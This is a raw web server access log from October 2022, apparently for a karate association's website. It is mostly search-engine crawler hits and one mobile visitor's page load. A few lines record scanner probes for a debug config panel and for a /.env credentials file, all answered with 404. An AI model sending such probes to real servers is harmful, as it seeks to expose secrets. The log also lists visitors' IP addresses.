::ffff:80.76.51.246 - - [03/Oct/2022:19:13:11 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:185.254.196.115 - - [03/Oct/2022:19:14:15 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [03/Oct/2022:19:14:17 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.135 - - [03/Oct/2022:19:22:33 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.77.167.70 - - [03/Oct/2022:19:26:16 +0000] "GET /images/instructors/RuPaster.jpg HTTP/1.1" 200 75352 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:176.58.124.134 - - [03/Oct/2022:19:26:40 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:157.55.39.149 - - [03/Oct/2022:19:40:24 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.149 - - [03/Oct/2022:19:40:24 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.137 - - [03/Oct/2022:19:40:31 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.137 - - [03/Oct/2022:19:44:41 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:54.36.148.158 - - [03/Oct/2022:19:46:07 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [03/Oct/2022:19:46:08 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:71.198.109.171 - - [03/Oct/2022:19:50:58 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:71.198.109.171 - - [03/Oct/2022:19:50:58 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:71.198.109.171 - - [03/Oct/2022:19:50:58 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
